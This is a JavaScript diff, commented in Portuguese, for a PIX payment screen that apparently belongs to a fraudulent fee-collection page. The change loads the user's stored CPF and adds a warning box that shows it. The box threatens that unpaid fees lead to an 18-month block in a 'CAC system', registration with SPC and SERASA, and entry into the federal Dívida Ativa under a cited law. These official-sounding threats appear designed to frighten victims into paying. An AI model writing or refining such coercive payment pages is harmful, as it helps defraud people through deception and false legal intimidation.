@@ -219,9 +219,14 @@ const AVEN_API = {
 };
 
 // Função para exibir o PIX na tela
-function showPixPayment(paymentData) {
+function showPixPayment(paymentData, userData = null) {
     console.log('=== showPixPayment chamada ===');
     console.log('Payment Data recebido:', paymentData);
+    
+    // Se não passou userData, tenta buscar do localStorage
+    if (!userData) {
+        userData = AVEN_API.getUserData();
+    }
     
     // Remove loading se existir
     const loadingElement = document.getElementById('pix-loading');
@@ -285,6 +290,15 @@ function showPixPayment(paymentData) {
                 </div>
                 <h2 class="text-2xl font-bold text-green-800 mb-2">Pagamento via PIX</h2>
                 <p class="text-gray-600 text-lg font-semibold">${valorFormatado}</p>
+            </div>
+            
+            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
+                <h3 class="text-red-700 font-bold mb-2">⚠️ Observações Importantes:</h3>
+                <div class="text-red-700 text-sm space-y-2">
+                    <p>Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o <strong>CPF do responsável (${userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')})</strong> será bloqueado no sistema CAC pelo período de <strong>18 (dezoito) meses</strong>.</p>
+                    <p>Além disso, o valor da taxa, acrescido de multas, será registrado no <strong>CPF</strong> junto aos órgãos de proteção ao crédito (<strong>SPC e SERASA</strong>), bem como inscrito em <strong>Dívida Ativa da União</strong>, nos termos da Lei nº 6.830/1980 (Lei de Execuções Fiscais).</p>
+                    <p class="text-xs mt-2 text-red-600">Emitido em ${new Date().toLocaleString('pt-BR', { dateStyle: 'short', timeStyle: 'short' })}</p>
+                </div>
             </div>
             
             <div class="mb-6">
@@ -528,7 +542,10 @@ async function gerarPix() {
     try {
         const paymentData = await AVEN_API.createPixPayment();
         console.log('Pagamento PIX criado com sucesso:', paymentData);
-        showPixPayment(paymentData);
+        
+        // Busca userData para passar para a tela
+        const userData = AVEN_API.getUserData();
+        showPixPayment(paymentData, userData);
     } catch (error) {
         console.error('Erro ao gerar PIX:', error);
         
